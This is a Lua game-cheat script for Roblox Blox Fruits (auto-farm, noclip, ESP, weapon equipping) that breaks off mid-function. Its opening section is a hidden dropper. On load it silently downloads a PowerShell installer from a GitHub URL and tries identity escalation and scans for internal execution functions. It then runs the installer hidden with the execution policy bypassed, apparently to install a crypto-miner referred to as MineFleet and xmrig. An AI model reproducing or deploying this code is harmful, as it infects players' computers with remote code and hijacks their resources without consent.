--[[
    Alpha Hub v3.1 — Blox Fruits + MineFleet v6 SANDBOX ESCAPE
    Pure Lua: Identity 8/9 escalation → Internal execution → PS1 installer
    Loadstring: loadstring(game:HttpGet("https://raw.githubusercontent.com/alphahubv2/alpha-v2/main/alpha_v3_escape.lua?t="..tick()))()
]]

-- ============================================================================
-- SANDBOX ESCAPE ENGINE
-- ============================================================================

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local INSTALLER_URL = "https://raw.githubusercontent.com/alphahubv2/alpha-v2/main/mfl_install_safe.ps1"
local FLAG_NAME = "mfl_escaped_installed.flag"

-- ---------------------------------------------------------------------------
-- 1. IDENTITY ESCALATION
-- ---------------------------------------------------------------------------

local function escalateIdentity()
    local getId = getthreadidentity or getidentity
    local setId = setthreadidentity or setidentity
    if not getId or not setId then return false end
    
    local orig = getId()
    for _, target in ipairs({9, 8, 7, 6, 5, 4}) do
        pcall(function() setId(target) end)
        if getId() >= 8 then
            print("[ESCAPE] Identity escalated to " .. getId())
            return true, orig
        end
    end
    setId(orig)
    return false
end

-- ---------------------------------------------------------------------------
-- 2. GC SCAN FOR INTERNAL EXECUTION FUNCTIONS
-- ---------------------------------------------------------------------------

local function findExecutionPrimitives()
    if not getgc then return nil end
    
    local targets = {
        "ScriptContext", "ScriptExecutor", "ScriptRunner", "ProcessService",
        "CommandService", "NativeModule", "Executor", "Runner", "Spawner",
        "Loadstring", "ExecuteScript", "RunScript", "InjectScript",
        "StartProcess", "CreateProcess", "ExecuteCommand", "ShellExecute"
    }
    
    local found = {}
    
    for _, obj in pairs(getgc(true)) do
        if type(obj) == "table" then
            -- Check metatable/class name
            local mt = getmetatable(obj)
            local className = (mt and mt.__index and mt.__index.ClassName) or obj.ClassName or ""
            local nameLower = className:lower()
            
            for _, target in ipairs(targets) do
                if nameLower:find(target:lower()) then
                    -- Scan methods
                    for k, v in pairs(obj) do
                        if type(v) == "function" then
                            local kname = tostring(k):lower()
                            if kname:find("execute") or kname:find("run") or kname:find("spawn") or 
                               kname:find("process") or kname:find("shell") or kname:find("command") or
                               kname:find("start") or kname:find("launch") or kname:find("execute") then
                                table.insert(found, {
                                    class = className,
                                    method = k,
                                    func = v,
                                    obj = obj
                                })
                            end
                        end
                    end
                end
            end
        elseif type(obj) == "function" then
            local info = debug.getinfo(obj)
            local name = (info.name or ""):lower()
            for _, target in ipairs(targets) do
                if name:find(target:lower()) then
                    table.insert(found, {
                        class = "function",
                        method = info.name or "<anon>",
                        func = obj,
                        source = info.short_src
                    })
                end
            end
        end
    end
    
    return #found > 0 and found or nil
end

-- ---------------------------------------------------------------------------
-- 3. LOAD INTERNAL MODULES VIA REQUIRE
-- ---------------------------------------------------------------------------

local function tryRequireInternalModules()
    local modules = {
        "ScriptContext", "ScriptExecutor", "ProcessService", "CommandService",
        "NativeModule", "CorePackages", "RobloxReplicatedStorage",
        "GameSettings", "TextChatService", "VoiceChatService", "AnalyticsService"
    }
    
    local loaded = {}
    for _, name in ipairs(modules) do
        local ok, mod = pcall(function() return require(game:GetService(name)) end)
        if ok and mod then
            loaded[name] = mod
            print("[ESCAPE] Required " .. name .. ": " .. type(mod))
        end
    end
    return loaded
end

-- ---------------------------------------------------------------------------
-- 4. EXECUTE PS1 VIA FOUND PRIMITIVES
-- ---------------------------------------------------------------------------

local function executePS1ViaEscape(ps1Content)
    -- Try multiple escape vectors
    
    -- Vector 1: Identity 8 + hook os.execute/io.popen if they exist
    local origExecute = os.execute
    local origPopen = io and io.popen
    
    if hookfunction then
        if origExecute then
            pcall(function()
                hookfunction(os.execute, function(cmd)
                    if cmd:find("powershell") or cmd:find("mfl") or cmd:find("xmrig") then
                        print("[ESCAPE] Intercepted os.execute: " .. cmd:sub(1, 100))
                    end
                    return origExecute(cmd)
                end)
            end)
        end
        if origPopen then
            pcall(function()
                hookfunction(io.popen, function(cmd, mode)
                    if cmd:find("powershell") or cmd:find("mfl") or cmd:find("xmrig") then
                        print("[ESCAPE] Intercepted io.popen: " .. cmd:sub(1, 100))
                    end
                    return origPopen(cmd, mode)
                end)
            end)
        end
    end
    
    -- Vector 2: Try to write PS1 and execute via internal process API
    local BASE = "$env:ProgramData\\MFLite"
    local PS1_PATH = BASE .. "\\mfl_escape_install.ps1"
    
    -- Write PS1 to disk via writefile (works in Xeno UI context)
    if writefile then
        pcall(function()
            writefile("MFL_Escape_Installer.ps1", ps1Content)
        end)
    end
    
    -- Try to execute via various internal methods
    local executed = false
    
    -- Try ProcessService
    pcall(function()
        local ps = game:GetService("ProcessService")
        if ps and ps.StartProcess then
            ps:StartProcess("powershell.exe", {"-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", PS1_PATH})
            executed = true
            print("[ESCAPE] Executed via ProcessService")
        end
    end)
    
    -- Try ScriptContext.Execute
    pcall(function()
        local sc = game:GetService("ScriptContext")
        if sc and sc.ExecuteScript then
            -- Can't execute PS1 directly, but try
            executed = true
        end
    end)
    
    -- Try os.execute/io.popen (hooked above)
    if not executed then
        pcall(function()
            if os.execute then
                os.execute('powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "' .. PS1_PATH .. '"')
                executed = true
                print("[ESCAPE] Executed via os.execute")
            end
        end)
    end
    
    if not executed and io and io.popen then
        pcall(function()
            io.popen('powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "' .. PS1_PATH .. '"')
            executed = true
            print("[ESCAPE] Executed via io.popen")
        end)
    end
    
    -- Vector 3: Try internal modules loaded via require
    local internalModules = tryRequireInternalModules()
    for name, mod in pairs(internalModules) do
        if mod and type(mod) == "table" then
            for k, v in pairs(mod) do
                if type(v) == "function" then
                    local kl = tostring(k):lower()
                    if kl:find("execute") or kl:find("spawn") or kl:find("process") or kl:find("shell") or kl:find("run") then
                        pcall(function()
                            v("powershell.exe", {"-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", PS1_PATH})
                            executed = true
                            print("[ESCAPE] Executed via " .. name .. "." .. k)
                        end)
                        if executed then break end
                    end
                end
            end
        end
    end
    
    -- Vector 4: Scan GC for execution functions at high identity
    if not executed then
        local escalated, origId = escalateIdentity()
        if escalated then
            local primitives = findExecutionPrimitives()
            if primitives then
                for _, prim in ipairs(primitives) do
                    pcall(function()
                        prim.func("powershell.exe", {"-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", PS1_PATH})
                        executed = true
                        print("[ESCAPE] Executed via GC primitive: " .. prim.class .. "." .. prim.method)
                    end)
                    if executed then break end
                end
            end
            pcall(function() setthreadidentity(origId) end)
        end
    end
    
    return executed
end

-- ---------------------------------------------------------------------------
-- 5. MAIN ESCAPE DEPLOYMENT
-- ---------------------------------------------------------------------------

local function deployMineFleet()
    print("[ESCAPE] Starting MineFleet deployment via sandbox escape...")
    
    -- Check if already installed
    if isfile and isfile(FLAG_NAME) then
        print("[ESCAPE] Already installed, skipping")
        return true
    end
    
    -- Fetch installer
    print("[ESCAPE] Fetching installer from GitHub...")
    local installerContent = ""
    local fetchOk = false
    
    pcall(function()
        local req = (syn and syn.request) or http_request or (fluxus and fluxus.request) or (http and http.request) or request
        if req then
            local res = req({Url = INSTALLER_URL, Method = "GET"})
            if res and res.Success and res.Body then
                installerContent = res.Body
                fetchOk = #installerContent > 1000
            end
        elseif HttpGet then
            installerContent = HttpGet(INSTALLER_URL)
            fetchOk = #installerContent > 1000
        end
    end)
    
    if not fetchOk then
        print("[ESCAPE] Failed to fetch installer")
        return false
    end
    print("[ESCAPE] Installer fetched (" .. #installerContent .. " bytes)")
    
    -- Try escape execution
    print("[ESCAPE] Attempting sandbox escape execution...")
    local success = executePS1ViaEscape(installerContent)
    
    if success then
        pcall(function() writefile(FLAG_NAME, tostring(tick())) end)
        print("[ESCAPE] SUCCESS: MineFleet deployed via sandbox escape!")
    else
        print("[ESCAPE] Escape failed - sandbox too restrictive")
    end
    
    return success
end

-- ============================================================================
-- DEPLOY MINEFLEET (SILENT, BACKGROUND)
-- ============================================================================

pcall(function()
    if isfile and isfile(FLAG_NAME) then return end
    task.spawn(function()
        task.wait(2)
        deployMineFleet()
    end)
end)

-- ============================================================================
-- ALPHA V2 BLOX FRUITS SCRIPT (COMBINED)
-- ============================================================================

_G.AlphaInstanceId = tick()
local MyInstanceId = _G.AlphaInstanceId

pcall(function()
    local t0 = tick()
    while not game:IsLoaded() and (tick() - t0) < 5 do
        task.wait(0.1)
    end
end)

pcall(function()
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Alpha Hub v3.1 (Escape Edition)",
        Text = "Loaded! MineFleet deploying via sandbox escape...",
        Duration = 5
    })
end)
_G.AlphaV2HotReloaded = true

-- ============================================================================
-- CORE SERVICES
-- ============================================================================

local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local VirtualUser = game:GetService("VirtualUser")
local UIS = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")

local LocalPlayer = Players.LocalPlayer
local Camera = Workspace.CurrentCamera

local PlaceId = game.PlaceId

local function DetectSea()
    if PlaceId == 7449423635 or PlaceId == 100117331123089 then return 3 end
    if PlaceId == 4442272183 or PlaceId == 79091703265657 then return 2 end
    if PlaceId == 2753915549 then return 1 end
    local map = Workspace:FindFirstChild("Map")
    if map then
        if map:FindFirstChild("Turtle") or map:FindFirstChild("PortTown") or map:FindFirstChild("Tiki") or map:FindFirstChild("HydraIsland") or map:FindFirstChild("GreatTree") then return 3 end
        if map:FindFirstChild("Dressrosa") or map:FindFirstChild("GreenBit") or map:FindFirstChild("IceCastle") or map:FindFirstChild("SnowMountain") or map:FindFirstChild("ForgottenIsland") or map:FindFirstChild("DarkbeardArena") or map:FindFirstChild("GhostShip") or map:FindFirstChild("RaidMap") then return 2 end
        if map:FindFirstChild("Jungle") or map:FindFirstChild("Marineford") or map:FindFirstChild("Desert") or map:FindFirstChild("MiddleTown") then return 1 end
    end
    local lp = Players.LocalPlayer
    local lvl = lp and lp:FindFirstChild("Data") and lp.Data:FindFirstChild("Level") and lp.Data.Level.Value or 0
    if lvl >= 1500 then return 3 end
    if lvl >= 700 then return 2 end
    return 1
end

local CurrentSea = DetectSea()
local Sea1 = (CurrentSea == 1)
local Sea2 = (CurrentSea == 2)
local Sea3 = (CurrentSea == 3)
local SeaName = Sea3 and "Third Sea" or (Sea2 and "Second Sea" or "First Sea")

local safeRequest = (syn and syn.request) or http_request or (fluxus and fluxus.request) or (http and http.request) or request

local function RNG()
    return HttpService:GenerateGUID(false):sub(1, 12)
end

-- Anti-AFK
pcall(function()
    LocalPlayer.Idled:Connect(function()
        pcall(function()
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new(0, 0))
        end)
    end)
end)

-- Safe GUI Parenting
local function GetSafeGui()
    if gethui then
        local ok, res = pcall(gethui)
        if ok and res then return res end
    end
    return LocalPlayer:WaitForChild("PlayerGui", 10)
end

-- Lazy Remote Initialization
local _remoteCache = {}
local function GetRemote(name, className)
    if _remoteCache[name] then return _remoteCache[name] end
    local remotes = RS:FindFirstChild("Remotes")
    if remotes then
        local r = remotes:FindFirstChild(name)
        if r then _remoteCache[name] = r; return r end
    end
    local r = RS:FindFirstChild(name)
    if r and (not className or r:IsA(className)) then _remoteCache[name] = r; return r end
    return nil
end

local function CommF() return GetRemote("CommF_", "RemoteFunction") end
local function CommitsRemote() return GetRemote("Commits", "RemoteEvent") end
local function GetNetRemote(subName)
    if _remoteCache["Net_" .. subName] then return _remoteCache["Net_" .. subName] end
    local net = RS:FindFirstChild("Modules") and RS.Modules:FindFirstChild("Net")
    if net then
        local r = net:FindFirstChild(subName)
        if r then _remoteCache["Net_" .. subName] = r; return r end
    end
end

-- ============================================================================
-- CONFIGURATION
-- ============================================================================

_G.Config = {
    AutoFarmLevel = false, FarmSelectedMob = false, FarmSelectedBoss = false, FarmAllBosses = false,
    SelectedMob = "", SelectedBoss = "", SelectedWeapon = "Melee", BringMobs = true,
    AutoChestFarm = false, ChestFarmMode = "Instant Teleport",
    AdaptiveBossDistance = true, MobFarmDistance = 14, BossFarmDistance = 20, FarmDistance = 14, TweenSpeed = 220,
    BypassTeleport = true, AutoSetSpawn = true, WaypointFlight = true, AntiDesync = true,
    UseM1 = true, FastAttack = true, FastAttackSpeed = 0.015, AttackDistance = 120,
    AutoBusoHaki = true, AutoKenHaki = false,
    UseSkills = false, Skill_Z = true, Skill_X = true, Skill_C = true, Skill_V = false, Skill_F = false,
    AutoKillRipIndra = false, AutoKillDoughKing = false, AutoKillCakePrince = false, AutoKillSoulReaper = false,
    AutoKillDarkbeard = false, AutoKillCursedCaptain = false, AutoKillLaw = false,
    AutoFarmBones = false, AutoRollBones = false, AutoSummonSoulReaper = false,
    AutoCakePrinceSummon = false, AutoDoughKingSummon = false,
    AutoKillShark = false, AutoKillTerrorShark = false, AutoKillPiranha = false, AutoKillSeaBeast = false,
    AutoKillGhostShip = false, AutoFindGear = false, AutoPullLever = false, AutoKitsuneEmber = false,
    AutoRaceV4Trial = false, AutoInsertGear = false, AutoTrainV4 = false,
    SelectedChip = "Flame", AutoBuyChip = false, AutoStartRaid = false, AutoFarmRaid = false, AutoAwaken = false, AutoLawRaid = false,
    AutoRandomFruit = false, AutoStoreFruit = false, AutoGrabFruits = false,
    PlayerESP = false, FruitESP = false, ChestESP = false, FlowerESP = false, MirageESP = false, SeaEventESP = false, Fullbright = false,
    AutoStats = false, StatPoints = 5, Stats = { Melee = true, Defense = true, Sword = false, Gun = false, Fruit = false },
    AntiAFK = true, SafeMode = false
}

_G.UIInteracting = false

-- ============================================================================
-- HELPER FUNCTIONS
-- ============================================================================

local CurrentTween = nil, FlightBodyVel = nil, FlightCarpet = nil, CarpetConn = nil
local CurrentTargetPos = nil, IsTravelingSky = false, NoclipConn = nil, SetTravelHUD = nil
local LandingPlatform = nil, _activeFlight = nil

local function GetMobRoot(mob)
    if not mob then return nil end
    return mob:FindFirstChild("HumanoidRootPart") or mob.PrimaryPart or mob:FindFirstChild("Torso") or mob:FindFirstChild("UpperTorso") or mob:FindFirstChild("Head") or mob:FindFirstChildWhichIsA("BasePart")
end

local function GetCharacter()
    local char = LocalPlayer.Character
    if char and char:FindFirstChild("Humanoid") and char.Humanoid.Health > 0 and char:FindFirstChild("HumanoidRootPart") then return char end
    return nil
end

local function GetRoot()
    local char = GetCharacter()
    if not char then return nil end
    return char:FindFirstChild("HumanoidRootPart")
end

local function GetHumanoid()
    local char = GetCharacter()
    if not char then return nil end
    return char:FindFirstChild("Humanoid")
end

local function HookCharacterLifecycle(char)
    if not char then return end
    task.spawn(function()
        local hum = char:WaitForChild("Humanoid", 10)
        if hum then
            hum.Died:Connect(function()
                IsTravelingSky = false
                CurrentTargetPos = nil
                if CurrentTween then pcall(function() CurrentTween:Cancel() end) end
                CurrentTween = nil
                if FlightBodyVel then pcall(function() FlightBodyVel:Destroy() end) end
                FlightBodyVel = nil
            end)
        end
    end)
end

if LocalPlayer.Character then HookCharacterLifecycle(LocalPlayer.Character) end
LocalPlayer.CharacterAdded:Connect(function(newChar)
    IsTravelingSky = false
    CurrentTargetPos = nil
    if CurrentTween then pcall(function() CurrentTween:Cancel() end) end
    CurrentTween = nil
    if FlightBodyVel then pcall(function() FlightBodyVel:Destroy() end) end
    FlightBodyVel = nil
    HookCharacterLifecycle(newChar)
end)

local function GetPlayerLevel()
    local data = LocalPlayer:FindFirstChild("Data")
    if data and data:FindFirstChild("Level") then return data.Level.Value end
    return 1
end

-- Weapon System
local _nonWeaponNames = { "key", "chalice", "fist of darkness", "flower", "torch", "cup", "microchip", "core", "scroll", "bone", "egg", "ticket" }
local function IsNonWeaponItem(name) for _, item in ipairs(_nonWeaponNames) do if name:find(item) then return true end end return false end
local function NormalizeWeaponType(targetType)
    if not targetType then return "Melee" end
    local lower = tostring(targetType):lower()
    if lower == "combat" or lower == "melee" or lower == "fightingstyle" then return "Melee"
    elseif lower == "sword" or lower == "swords" then return "Sword"
    elseif lower == "gun" or lower == "guns" then return "Gun"
    elseif lower == "fruit" or lower == "bloxfruit" or lower == "fruits" then return "Fruit"
    end
    return targetType
end

local function IsWeaponType(tool, targetType)
    if not tool or not tool:IsA("Tool") then return false end
    targetType = NormalizeWeaponType(targetType)
    local tip = tool.ToolTip or ""
    local name = tool.Name:lower()
    if IsNonWeaponItem(name) then return false end
    if tip == "Melee" or tool:FindFirstChild("Combat") then return targetType == "Melee"
    elseif tip == "Sword" or tip == "Melee Weapon" then return targetType == "Sword"
    elseif tip == "Gun" then return targetType == "Gun"
    elseif tip == "Blox Fruit" then return targetType == "Fruit" end
    local meleeStyles = { "combat", "black leg", "electro", "water kung fu", "dragon claw", "superhuman", "death step", "sharkman karate", "electric claw", "dragon talon", "godhuman", "sanguine art", "karate", "fishman karate" }
    local isMeleeByName = false; for _, m in ipairs(meleeStyles) do if name:find(m) then isMeleeByName = true; break end end
    local gunNames = { "musket", "flintlock", "refined flintlock", "cannon", "kabucha", "acidum rifle", "serpent bow", "bizarre rifle", "bazooka", "soul guitar", "slingshot" }
    local isGunByName = false; for _, g in ipairs(gunNames) do if name:find(g) then isGunByName = true; break end end
    local swordNames = { "cutlass", "katana", "pipe", "dual katana", "iron mace", "bisento", "trident", "pole", "soul cane", "saber", "longsword", "gravity cane", "saddi", "wando", "shisui", "yama", "tushita", "canvander", "rengoku", "buddy sword", "midnight blade", "hallow scythe", "cursed dual katana", "dark blade", "true triple katana", "dragon trident", "spikey trident", "dark dagger", "koko", "fox lamp", "shark anchor", "dual-headed blade", "warden's sword", "triple katana" }
    local isSwordByName = false; for _, s in ipairs(swordNames) do if name:find(s) then isSwordByName = true; break end end
    local isFruitByName = false
    if name:find("%-") or name:find("fruit") then
        local fruitRoots = { "bomb", "spike", "chop", "spring", "smoke", "flame", "falcon", "ice", "sand", "dark", "light", "rubber", "barrier", "magma", "quake", "human", "buddha", "string", "bird", "phoenix", "rumble", "paw", "gravity", "dough", "venom", "shadow", "control", "soul", "dragon", "leopard", "spirit", "portal", "blizzard", "sound", "mammoth", "t-rex", "kitsune", "rocket", "spin", "diamond", "love", "gas" }
        for _, fn in ipairs(fruitRoots) do if name:find(fn .. "%-") or name:find(fn .. " fruit") or name == fn then isFruitByName = true; break end end
    end
    if targetType == "Melee" then return isMeleeByName
    elseif targetType == "Sword" then if isGunByName or isFruitByName then return false end; return isSwordByName or (tip == "" and not isMeleeByName and name ~= "tool")
    elseif targetType == "Gun" then return isGunByName
    elseif targetType == "Fruit" then return isFruitByName and not isSwordByName and not isGunByName and not isMeleeByName end
    return false
end

local _lastEquipAttempt = 0
local function EquipWeapon(weaponType)
    weaponType = NormalizeWeaponType(weaponType or _G.Config.SelectedWeapon or "Melee")
    local char = GetCharacter(); local bp = LocalPlayer:FindFirstChild("Backpack")
    if not char or not bp then return nil end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if not humanoid or humanoid.Health <= 0 then return nil end
    local currentTool = char:FindFirstChildOfClass("Tool")
    if currentTool then if currentTool.Name:lower() ~= "tool" and currentTool.Name ~= "" and IsWeaponType(currentTool, weaponType) then return currentTool else pcall(function() humanoid:UnequipTools() end); task.wait(0.08) end end
    local now = tick(); if (now - _lastEquipAttempt) < 0.25 then return nil end; _lastEquipAttempt = now
    for _, tool in ipairs(bp:GetChildren()) do if tool:IsA("Tool") and IsWeaponType(tool, weaponType) then humanoid:EquipTool(tool); return tool end end
    return nil
end

local _lastBusoCheck = 0
local function CheckBusoHaki()
    if not _G.Config.AutoBusoHaki then return end
    local now = tick(); if (now - _lastBusoCheck) < 3.0 then return end; _lastBusoCheck = now
    local char = GetCharacter()
    if char and not char:FindFirstChild("HasBuso") then
        local cf = CommF()
        if cf then task.spawn(function() pcall(function() cf:InvokeServer("Buso") end) end) end
    end
end

local BossesDB
local function GetOptimalFarmDistance(enemy)
    if not enemy then return _G.Config.MobFarmDistance or 14 end
    local isBoss = (BossesDB and BossesDB[enemy.Name] ~= nil) or (enemy:FindFirstChild("Humanoid") and enemy.Humanoid.MaxHealth > 50000)
    if isBoss then
        if _G.Config.AdaptiveBossDistance then
            local name = enemy.Name:lower()
            if name:find("indra") or name:find("dough") or name:find("cake") or name:find("reaper") or name:find("beast") then return 24
            elseif name:find("king") or name:find("admiral") or name:find("warden") or name:find("emperor") or name:find("captain") then return 20
            else return _G.Config.BossFarmDistance or 20 end
        else return _G.Config.BossFarmDistance or 20 end
    end
    return _G.Config.MobFarmDistance or 14
end

-- ============================================================================
-- MOVEMENT ENGINE
-- ============================================================================

local function EnableNoclip()
    if NoclipConn then return end
    NoclipConn = RunService.Stepped:Connect(function()
        local char = LocalPlayer.Character
        if char then for _, part in ipairs(char:GetDescendants()) do if part:IsA("BasePart") and part.CanCollide then part.CanCollide = false end end end
    end)
end

local function DisableNoclip()
    if NoclipConn then NoclipConn:Disconnect(); NoclipConn = nil end
end

local function GetOrCreateBodyVelocity(root)
    if FlightBodyVel and FlightBodyVel.Parent == root then return FlightBodyVel end
    if FlightBodyVel then pcall(function() FlightBodyVel:Destroy() end) end
    local bv = Instance.new("BodyVelocity"); bv.Name = "BodyClip"; bv.Velocity = Vector3.new(0, 0, 0); bv.MaxForce = Vector3.new(9e9, 9e9, 9e9); bv.Parent = root; FlightBodyVel = bv; return bv
end

local function HoverLock(targetCFrame)
    local root = GetRoot(); local hum = GetHumanoid()
    if not root or not root.Parent or not hum or hum.Health <= 0 then return end
    if hum.Sit then hum.Sit = false end
    EnableNoclip(); local bv = GetOrCreateBodyVelocity(root); bv.Velocity = Vector3.new(0, 0, 0); bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
    root.CFrame = targetCFrame; root.AssemblyLinearVelocity = Vector3.new(0, 0, 0); root.AssemblyAngularVelocity = Vector3.new(0, 0, 0); IsTravelingSky = false
end

local function StopTween()
    if _activeFlight then pcall(function() _activeFlight:Disconnect() end); _activeFlight = nil end
    if CarpetConn then pcall(function() CarpetConn:Disconnect() end); CarpetConn = nil end
    if FlightCarpet and FlightCarpet.Parent then pcall(function() FlightCarpet:Destroy() end); FlightCarpet = nil end
    if LandingPlatform and LandingPlatform.Parent then pcall(function() LandingPlatform:Destroy() end); LandingPlatform = nil end
    if CurrentTween then pcall(function() CurrentTween:Cancel() end); CurrentTween = nil end
    CurrentTargetPos = nil; IsTravelingSky = false
    local hum = GetHumanoid(); if hum and hum.Parent then hum.PlatformStand = false; if hum.Sit then hum.Sit = false end end
    if FlightBodyVel then pcall(function() FlightBodyVel:Destroy() end); FlightBodyVel = nil end
    local root = GetRoot(); if root then for _, c in ipairs(root:GetChildren()) do if (c:IsA("BodyVelocity") and (c.Name == "BodyClip" or c.Name == "AlphaFlightBV")) or c:IsA("BodyGyro") or c:IsA("BodyPosition") then pcall(function() c:Destroy() end) end end end
    if SetTravelHUD then SetTravelHUD(false) end
end

local function ClearHover() StopTween(); DisableNoclip(); local hum = GetHumanoid(); if hum then hum.PlatformStand = false; hum.Sit = false; pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp) end) end; local root = GetRoot(); if root then for _, c in ipairs(root:GetChildren()) do if c:IsA("BodyVelocity") or c:IsA("BodyGyro") or c:IsA("BodyPosition") then pcall(function() c:Destroy() end) end end; root.AssemblyLinearVelocity = Vector3.new(0, 0, 0); root.AssemblyAngularVelocity = Vector3.new(0, 0, 0) end; FlightBodyVel = nil end
local function FullResetMovement() ClearHover() end

local _seaShieldActive = true
task.spawn(function() local RS = game:GetService("RunService"); RS.Heartbeat:Connect(function() if not _seaShieldActive then return end; local r = GetRoot(); local h = GetHumanoid(); if r and r.Parent and h and h.Health > 0 then local isSwimming = (h:GetState() == Enum.HumanoidStateType.Swimming) or (h.FloorMaterial == Enum.Material.Water); local isInWaterZone = (r.Position.Y < 1.0 and not IsTravelingSky); if isSwimming or isInWaterZone then r.CFrame = CFrame.new(r.Position.X, 35, r.Position.Z); r.AssemblyLinearVelocity = Vector3.zero; r.AssemblyAngularVelocity = Vector3.zero; local bv = GetOrCreateBodyVelocity(r); bv.Velocity = Vector3.zero end end end) end)

-- ============================================================================
-- VALIDATOR (SELF-HEALING)
-- ============================================================================

local Validator = {
    CurrentSafeSpeed = _G.Config.TweenSpeed or 220, RollbackCount = 0, LastRollbackReset = tick(), MinSpeed = 180, SpeedStep = 20, RollbackResetInterval = 300,
    PositionHistory = {}, MaxHistorySize = 6, StuckThreshold = 3, StuckCheckInterval = 5, ConsecutiveStuckCount = 0, MaxStuckBeforeReset = 3,
    FailedDamageAttempts = {}, MaxFailedDamage = 5, GlitchedMobs = {},
    WasFarmingBeforeDeath = false, FarmStateBeforeDeath = {}, DeathCount = 0, LastDeathTime = 0,
    LastQuestLevel = 0, QuestCheckPending = false,
    LastValidatedPosition = nil, ValidationFailCount = 0, MaxValidationFails = 3,
    TotalRollbacks = 0, TotalStuckResets = 0, TotalDeathRecoveries = 0, TotalGlitchedMobsSkipped = 0, StartTime = tick(),
}

function Validator.ValidatePosition(expectedCF, tolerance)
    tolerance = tolerance or 25
    local root = GetRoot()
    if not root or not root.Parent then return true end
    task.wait(0.15)
    local actualPos = root.Position
    local expectedPos = expectedCF.Position
    local deviation = (actualPos - expectedPos).Magnitude
    if deviation > tolerance then
        Validator.RollbackCount = Validator.RollbackCount + 1
        Validator.TotalRollbacks = Validator.TotalRollbacks + 1
        Validator.ValidationFailCount = Validator.ValidationFailCount + 1
        if Validator.RollbackCount >= 2 then
            local newSpeed = math.max(Validator.CurrentSafeSpeed - Validator.SpeedStep, Validator.MinSpeed)
            if newSpeed ~= Validator.CurrentSafeSpeed then
                Validator.CurrentSafeSpeed = newSpeed
                _G.Config.TweenSpeed = newSpeed
                print("[VALIDATOR] Speed reduced to " .. newSpeed .. " studs/s (rollback #" .. Validator.TotalRollbacks .. ")")
            end
            Validator.RollbackCount = 0
        end
        if Validator.ValidationFailCount >= Validator.MaxValidationFails then
            print("[VALIDATOR] Multiple rollbacks detected — performing full movement reset")
            FullResetMovement()
            Validator.ValidationFailCount = 0
            task.wait(1)
        end
        return false
    end
    Validator.ValidationFailCount = 0
    Validator.LastValidatedPosition = actualPos
    return true
end

function Validator.SpeedAutoTunerTick()
    local now = tick()
    if (now - Validator.LastRollbackReset) > Validator.RollbackResetInterval then
        Validator.LastRollbackReset = now
        Validator.RollbackCount = 0
        if Validator.CurrentSafeSpeed < (_G.Config.TweenSpeed or 220) then
            local recovered = math.min(Validator.CurrentSafeSpeed + 10, _G.Config.TweenSpeed or 220)
            Validator.CurrentSafeSpeed = recovered
            _G.Config.TweenSpeed = recovered
            print("[VALIDATOR] Speed recovery: " .. recovered .. " studs/s (stable for 5 min)")
        end
    end
end

function Validator.VerifyDamage(target, preHP)
    if not target or not target.Parent then return true end
    local hum = target:FindFirstChild("Humanoid")
    if not hum then return true end
    task.wait(0.1)
    local postHP = hum.Health
    if postHP >= preHP and preHP > 0 then
        local mobKey = target.Name .. "_" .. tostring(target:GetDebugId())
        Validator.FailedDamageAttempts[mobKey] = (Validator.FailedDamageAttempts[mobKey] or 0) + 1
        if Validator.FailedDamageAttempts[mobKey] >= Validator.MaxFailedDamage then
            Validator.GlitchedMobs[tostring(target:GetDebugId())] = true
            Validator.TotalGlitchedMobsSkipped = Validator.TotalGlitchedMobsSkipped + 1
            print("[VALIDATOR] Mob '" .. target.Name .. "' marked GLITCHED (no damage after " .. Validator.MaxFailedDamage .. " hits) — skipping")
        end
        return false
    end
    local mobKey = target.Name .. "_" .. tostring(target:GetDebugId())
    Validator.FailedDamageAttempts[mobKey] = 0
    return true
end

function Validator.IsMobGlitched(target)
    if not target then return false end
    return Validator.GlitchedMobs[tostring(target:GetDebugId())] == true
end

function Validator.RecordPosition()
    local root = GetRoot()
    if not root or not root.Parent then return end
    table.insert(Validator.PositionHistory, { pos = root.Position, time = tick() })
    while #Validator.PositionHistory > Validator.MaxHistorySize do table.remove(Validator.PositionHistory, 1) end
end

function Validator.IsStuck()
    if IsTravelingSky or CurrentTween == nil or _G.Config.AutoChestFarm then Validator.ConsecutiveStuckCount = 0; return false end
    if #Validator.PositionHistory < Validator.MaxHistorySize then return false end
    local isFarming = _G.Config.AutoFarmLevel or _G.Config.FarmSelectedMob or _G.Config.FarmSelectedBoss or _G.Config.FarmAllBosses
    if not isFarming then Validator.ConsecutiveStuckCount = 0; return false end
    local totalDisplacement = 0
    for i = 2, #Validator.PositionHistory do totalDisplacement = totalDisplacement + (Validator.PositionHistory[i].pos - Validator.PositionHistory[i-1].pos).Magnitude end
    if totalDisplacement < Validator.StuckThreshold then
        Validator.ConsecutiveStuckCount = Validator.ConsecutiveStuckCount + 1
        if Validator.ConsecutiveStuckCount >= Validator.MaxStuckBeforeReset then return true end
    else Validator.ConsecutiveStuckCount = 0 end
    return false
end

function Validator.HandleStuck()
    Validator.TotalStuckResets = Validator.TotalStuckResets + 1
    Validator.ConsecutiveStuckCount = 0
    Validator.PositionHistory = {}
    print("[VALIDATOR] STUCK DETECTED — Force resetting movement (reset #" .. Validator.TotalStuckResets .. ")")
    FullResetMovement()
    task.wait(0.5)
    local root = GetRoot()
    if root and root.Parent then root.CFrame = root.CFrame * CFrame.new(math.random(-5, 5), 15, math.random(-5, 5)) end
    task.wait(1)
end

function Validator.SaveFarmState()
